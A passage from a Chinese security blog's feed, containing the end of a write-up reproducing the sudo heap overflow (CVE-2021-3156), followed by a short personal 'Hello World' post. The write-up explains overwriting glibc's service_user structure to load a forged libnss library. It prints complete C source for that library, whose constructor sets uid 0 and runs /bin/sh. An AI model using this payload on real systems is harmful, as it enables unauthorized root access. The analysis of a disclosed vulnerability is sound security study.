class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. service_user 结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">service_user</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="comment">/* And the link to the next entry.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">service_user</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="comment">/* Action according to result.  */</span></span><br><span class="line">lookup_actions actions[<span class="number">5</span>];</span><br><span class="line"><span class="comment">/* Link to the underlying library object.  */</span></span><br><span class="line">service_library *library;</span><br><span class="line"><span class="comment">/* Collection of known functions.  */</span></span><br><span class="line"><span class="keyword">void</span> *known;</span><br><span class="line"><span class="comment">/* Name of the service (`files&#x27;, `dns&#x27;, `nis&#x27;, ...).  */</span></span><br><span class="line"><span class="keyword">char</span> name[<span class="number">0</span>];</span><br><span class="line">&#125; service_user;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. nss_load_library() 函数</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nss_load_library</span> <span class="params">(service_user *ni)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (ni-&gt;library == <span class="literal">NULL</span>)</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="keyword">static</span> name_database default_table;</span><br><span class="line">   ni-&gt;library = nss_new_service (service_table ?: &amp;default_table,   <span class="comment">// （1）设置 ni-&gt;library</span></span><br><span class="line">                  ni-&gt;name);</span><br><span class="line">   <span class="keyword">if</span> (ni-&gt;library == <span class="literal">NULL</span>)</span><br><span class="line"> <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ni-&gt;library-&gt;lib_handle == <span class="literal">NULL</span>)</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="comment">/* Load the shared library.  */</span></span><br><span class="line">   <span class="keyword">size_t</span> shlen = (<span class="number">7</span> + <span class="built_in">strlen</span> (ni-&gt;name) + <span class="number">3</span></span><br><span class="line">              + <span class="built_in">strlen</span> (__nss_shlib_revision) + <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">int</span> saved_errno = errno;</span><br><span class="line">      <span class="keyword">char</span> shlib_name[shlen];</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Construct shared object name.  */</span></span><br><span class="line">      __stpcpy (__stpcpy (__stpcpy (__stpcpy (shlib_name,   <span class="comment">// （2）伪造的库文件名必须是 libnss_xxx.so</span></span><br><span class="line">                          <span class="string">&quot;libnss_&quot;</span>),</span><br><span class="line">                    ni-&gt;name),</span><br><span class="line">              <span class="string">&quot;.so&quot;</span>),</span><br><span class="line">        __nss_shlib_revision);</span><br><span class="line"></span><br><span class="line">      ni-&gt;library-&gt;lib_handle = __libc_dlopen (shlib_name); <span class="comment">// （3）加载目标库</span></span><br><span class="line">      <span class="comment">//continue long long function</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></blockquote><p>分析代码可知：如果溢出后可以覆盖<a href="https://elixir.bootlin.com/glibc/glibc-2.32/source/nss/nsswitch.h#L61"><code>service_user</code>结构</a>。该结构出现在libc的<a href="https://elixir.bootlin.com/glibc/glibc-2.32/source/nss/nsswitch.c#L320"><code>nss_load_library()</code>函数</a>中，用于加载动态链接库。如果能覆盖<code>service_user-&gt;name</code>，就能指定加载我们伪造的库，利用root权限运行非root权限的库。</p><p>我们要做的就是利用溢出部分将<strong>ni-&gt;library == null</strong>，所以找到距离我们占位块最近的一个service_user结构体即可。</p><p>gdb调试技巧： search -s <code>systemd</code> 和  search -s <code>mymachine</code> 定位出现的结构体，找到位置最合适的一个。</p><p>Demo:</p><p><img src="https://i.loli.net/2021/04/10/cLpqN4J7aKzWhrT.png" alt="寻找结构体.png"></p><p>最后一步：伪造<code>libnss_X/X.so.2</code>库</p><p>Demo:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __attribute__((constructor)) ___init(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> *argv[<span class="number">2</span>] = &#123;<span class="string">&quot;sh&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line"></span><br><span class="line">  setuid(<span class="number">0</span>);</span><br><span class="line">  setgid(<span class="number">0</span>);</span><br><span class="line">  seteuid(<span class="number">0</span>);</span><br><span class="line">  setegid(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, argv, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>加载该库函数即可get shell.</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>基本思路是：通过输入特定环境变量，使得释放特定大小LC_ALL变量堆块占位到<code>service_user</code>结构体上方为目标来进行，使得service结构体加载自定义库函数。</p><p>在阅读Qualys的报告时注意到，在寻找利用点时使用了fuzz的方法，找到了三个较为稳定的利用点，这点值得以后深入了解。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CVE-2021-25646堆溢出漏洞复现及分析&quot;&gt;&lt;a href=&quot;#CVE-2021-25646堆溢出漏洞复现及分析&quot; class=&quot;headerlink&quot; title=&quot;CVE-2021-25646堆溢出漏洞复现及分析&quot;&gt;&lt;/a&gt;CVE-2021-25646</summary>
      
    
    
    
    <category term="CVE" scheme="http://example.com/categories/CVE/"/>
    
    
    <category term="堆溢出" scheme="http://example.com/tags/%E5%A0%86%E6%BA%A2%E5%87%BA/"/>
    
    <category term="CVE-2021-3156" scheme="http://example.com/tags/CVE-2021-3156/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://example.com/2021/04/08/hello_world/"/>
    <id>http://example.com/2021/04/08/hello_world/</id>
    <published>2021-04-08T03:20:01.320Z</published>
    <updated>2021-04-08T17:06:24.341Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一个新的开始"><a href="#一个新的开始" class="headerlink" title="一个新的开始"></a>一个新的开始</h1><blockquote><p>“我所有的欲望和沉思，都是这个宇宙缓缓呼出的气流。在这漫长的呼气结束之前，我的思维将一直存在。”</p></blockquote><p>​    几经周折终于面前搭建好了属于自己的博客，一个属于自己的空间。长久以来，我与外界的关系是作为一个消费者，消费物质和内容。2021年希望自己可以做一个生产者，创作者，把博客作为方法，输出和记录一些内容。</p><p><img src="https://i.loli.net/2021/04/09/4OQIETdyGWwLYbX.png" alt="rosie_2560_1600.png">    </p><p>:)</p><p>Hello world.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一个新的开始&quot;&gt;&lt;a href=&quot;#一个新的开始&quot; class=&quot;headerlink&quot; title=&quot;一个新的开始&quot;&gt;&lt;/a&gt;一个新的开始&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;“我所有的欲望和沉思，都是这个宇宙缓缓呼出的气流。在这漫长的呼气结束之前，我的思维</summary>
      
    
    
    
    <category term="my_space" scheme="http://example.com/categories/my-space/"/>
    
    
    <category term="say_something" scheme="http://example.com/tags/say-something/"/>
    
  </entry>
  
</feed>
